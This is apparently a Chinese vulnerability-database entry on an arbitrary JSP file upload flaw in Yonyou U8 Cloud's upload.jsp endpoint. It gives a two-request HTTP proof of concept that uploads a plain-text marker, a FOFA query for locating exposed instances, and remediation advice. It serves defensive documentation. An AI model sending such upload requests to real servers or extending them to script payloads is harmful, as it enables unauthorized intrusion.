---
source: "https://github.com/zan8in/afrog-pocs/blob/253291be2d307a6c836d5997bbb838f1e846f9ba/vulnerability/yonyou-u8-cloud-fileupload.yaml"
title: "用友U8 Cloud linux/pages/upload.jsp上传"
product: "用友U8 Cloud"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本明确未知；写入和访问不等于执行"
prerequisites: "无Cookie样例"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%94%A8%E5%8F%8BU8/%E7%94%A8%E5%8F%8B%20U8-Cloud%20upload.jsp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"用友-U8-Cloud\""
id: "vw-e00eb1e3050cd6ba752d1868"
entity_id: "ve-e00eb1e3050cd6ba752d1868"
schema_version: "1"
---

# 用友U8 Cloud linux/pages/upload.jsp上传

## 条目说明

- 对象与具体问题：用友U8 Cloud；linux/pages/upload.jsp上传
- 版本、配置及部署条件：版本明确未知；写入和访问不等于执行
- 认证与权限前提：无Cookie样例
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 固定提交、纯文本写入判据和清理要求较完整，正确限定不证明JSP执行
- 仍缺根因、鉴权说明和适用补丁版本，不应扩展全版本

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

### 漏洞描述

用友 U8-Cloud 的 `/linux/pages/upload.jsp` 接口存在文件上传校验不足的风险。公开 PoC 通过 `filename` 请求头设置 JSP 扩展名文件，直接发送纯文本请求体，再读取 `/linux/` 下的同名文件以验证落地。

### 影响范围

具体受影响版本范围未披露。本文按公开 PoC 所列产品记录，不据此扩展为全版本受影响。

### 公开验证方法

```http
POST /linux/pages/upload.jsp HTTP/1.1
Host: example.invalid
filename: vulwiki-check-20261002.jsp
Content-Type: application/octet-stream

vulwiki-upload-marker-20261002
```

```http
GET /linux/vulwiki-check-20261002.jsp HTTP/1.1
Host: example.invalid
```

上例把模板的随机文件名和纯文本随机标记固定化以便阅读；授权验证应使用唯一文件名并在结束后清理。第二次响应必须包含本次上传的完整标记。该结果证明文件落地与可访问，不能仅凭扩展名或 200 状态码断言服务端脚本执行。本文仅核对公开源码，未上传文件或进行本地复现。

### 修复建议

向用友获取适用安全更新。对上传接口实施服务端鉴权，限制文件名和类型，并将上传文件存放于不能执行脚本的目录。

### 参考链接

- [zan8in/afrog-pocs 原始 PoC（固定提交）](https://github.com/zan8in/afrog-pocs/blob/253291be2d307a6c836d5997bbb838f1e846f9ba/vulnerability/yonyou-u8-cloud-fileupload.yaml)

### 网络测绘

```text
app="用友-U8-Cloud"
```
